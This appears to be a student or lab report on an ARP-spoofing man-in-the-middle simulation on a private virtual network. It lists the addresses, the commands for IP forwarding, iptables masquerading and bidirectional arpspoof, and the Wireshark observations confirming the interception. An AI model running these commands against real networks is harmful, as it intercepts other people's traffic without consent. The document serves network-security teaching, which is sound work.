MITM Simulation Analysis Report
Date: April 2025

Network Details:
- Attacker IP: 10.0.2.15
- Gateway IP: 10.0.2.2
- Victim IP: 10.0.2.4
- Interface: eth0

Tools Used:
- Wireshark for monitoring
- arpspoof for MITM

Commands Executed:
- sudo sysctl -w net.ipv4.ip_forward=1
- sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
- sudo arpspoof -i eth0 -t 10.0.2.4 10.0.2.2
- sudo arpspoof -i eth0 -t 10.0.2.2 10.0.2.4

Observations in Wireshark
- Repeated ARP broadcast packets indicating spoofing
- The ARP tables (as seen through ARP packets) shows victim and gateway associating our MAC address with each other.
- Additional IP traffic captured between the victim and gateway.

Conclusion:
- The MITM attack was successful. 
- The attacker intercepted communications between the victim and gateway.
